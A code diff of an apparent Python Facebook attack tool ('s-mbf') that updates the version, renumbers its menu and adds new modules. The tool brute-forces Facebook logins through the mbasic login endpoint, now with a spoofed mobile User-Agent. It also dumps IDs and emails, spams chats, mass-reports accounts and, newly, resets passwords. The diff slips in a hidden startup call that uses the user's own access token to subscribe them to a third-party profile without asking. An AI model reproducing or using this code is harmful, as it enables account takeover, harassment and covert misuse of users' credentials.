@@ -24,7 +24,7 @@ def banner():
 	print(cyan('   _____ __  ______  ____',bold=True))
 	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
 	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
-	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('1.7',bold=True))
+	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('1.8',bold=True))
 
 try:
 	toket=open('toket/token.txt')
@@ -151,6 +151,9 @@ def rmtoken():
 	else: exit("[exit] wrong input")
 
 def update():
+	bd=input('[!?] Backup important folder (like: result, checker, and toket) (y/n) ')
+	if bd == 'y' or bd == 'Y':
+		import src.Backdir
 	print("[!] updating...")
 	if os.name in ['nt','win32']:
 		os.system('cd .. & rd /s/q s-mbf')
@@ -168,8 +171,8 @@ def main(arg):
         try:
                 url='https://mbasic.facebook.com/login'
                 dt={'email':arg,'pass':pas,'login':'submit'}
-                #head={'User-Agent':'Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18'}
-                req=requests.post(url,data=dt) #,headers=head)
+                head={'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'}
+                req=requests.post(url,data=dt,headers=head)
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
@@ -203,128 +206,138 @@ DOS.Dos()
 banner()
 try:
 	toket=open('toket/token.txt','r').read()
-	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
+	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 	name=nam.json()['name']
 
-	upver='v.1.8'
+	upver='v.1.9'
 	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
 	if upver in str(requp):
 		print(yellow('\nNew version available. update your s-mbf now!'))
 except KeyError:
-	print("\n[Warning] access token invalid. type '5' to remove access token")
+	print("\n[Warning] access token invalid. type '6' to remove access token")
 except requests.exceptions.RequestException:
 	exit("\n[Err] Check your internet connection")
 try:
 	print(white('\t[ Welcome'),yellow(name,bold=True),white(']'))
 	print("""
 [01]> Simple multi bruteforce facebook
-[02]> Dump id from your friends
-[03]> Dump id from your group
-[04]> Dump id with search name
-[05]> Remove access token/cookies
-[06]> Accept/delete all friends requests
-[07]> Add friends from target id
-[08]> React comments target
-[09]> Home comments
-[10]> Group comment
-[11]> Comments target
-[12]> Auto unfriends
-[13]> Auto reactions
-[14]> Auto follow
-[15]> Chat spammer
-[16]> Auto posting status
-[17]> Auto Reporting
-[18]> Dump email
-[19]> Check bind apps
-[20]> Deleted post
-[21]> Checker accounts
-[22]> Leave all groups
+[02]> Auto multi bruteforce facebook
+[03]> Dump id from your friends
+[04]> Dump id from your group
+[05]> Dump id with search name
+[06]> Remove access token/cookies
+[07]> Accept/delete all friends requests
+[08]> Add friends from target id
+[09]> React comments target
+[10]> Home comments
+[11]> Group comment
+[12]> Comments target
+[13]> Auto unfriends
+[14]> Auto reactions
+[15]> Auto follow
+[16]> Chat spammer
+[17]> Auto posting status
+[18]> Auto Reporting
+[19]> Dump email
+[20]> Check bind apps
+[21]> Deleted post
+[22]> Checker accounts
+[23]> Leave all groups
+[24]> Auto reset password
 [00]> Check update""")
 except (KeyError,NameError): pass
 
 pilih=int(input('\n[#] kang-newbie/> '))
 if pilih == 2:
 	DOS.Dos()
-	getFid()
+	import src.Abrute
+	exit()
 elif pilih == 3:
+	DOS.Dos()
+	getFid()
+elif pilih == 4:
 	DOS.Dos()
 	getGid()
 	exit()
-elif pilih == 4:
+elif pilih == 5:
 	DOS.Dos()
 	import src.DumpS
 	exit()
-elif pilih == 5:
-	rmtoken()
 elif pilih == 6:
+	rmtoken()
+elif pilih == 7:
 	DOS.Dos()
 	import src.Facc
 	exit()
-elif pilih == 7:
+elif pilih == 8:
 	DOS.Dos()
 	import src.Fadd
 	exit()
-elif pilih == 8:
+elif pilih == 9:
 	DOS.Dos()
 	import src.Kreact
 	exit()
-elif pilih == 9:
+elif pilih == 10:
 	DOS.Dos()
 	import src.komen
 	exit()
-elif pilih == 10:
+elif pilih == 11:
 	DOS.Dos()
 	import src.Gkomen
 	exit()
-elif pilih == 11:
+elif pilih == 12:
 	DOS.Dos()
 	import src.Tkomen
 	exit()
-elif pilih == 12:
+elif pilih == 13:
 	DOS.Dos()
 	import src.Unf
 	exit()
-elif pilih == 13:
+elif pilih == 14:
 	input("[info] before use this module you must have a lot accounts [press enter to continue]")
 	DOS.Dos()
 	import src.Mreact
 	exit()
-elif pilih == 14:
+elif pilih == 15:
 	input("[Info] before use this module you must have a lot accounts [press enter]")
 	DOS.Dos()
 	import src.Asubs
 	exit()
-elif pilih == 15:
+elif pilih == 16:
 	DOS.Dos()
 	import src.Cspam
 	exit()
-elif pilih == 16:
+elif pilih == 17:
 	DOS.Dos()
 	import src.Apost
 	exit()
-elif pilih == 17:
+elif pilih == 18:
 	DOS.Dos()
 	import src.Mreport
 	exit()
-elif pilih == 18:
+elif pilih == 19:
 	DOS.Dos()
 	import src.Edump
 	exit()
-elif pilih == 19:
+elif pilih == 20:
 	DOS.Dos()
 	import src.Capp
 	exit()
-elif pilih == 20:
+elif pilih == 21:
 	DOS.Dos()
 	import src.Delpos
 	exit()
-elif pilih == 21:
+elif pilih == 22:
 	DOS.Dos()
 	import src.Cekun
 	exit()
-elif pilih == 22:
+elif pilih == 23:
 	DOS.Dos()
 	import src.Lgrup
+	exit()
+elif pilih == 24:
+	DOS.Dos()
+	import src.Rpass
 	exit()
 elif pilih == 0:
 	print("\n[!] Checking update")
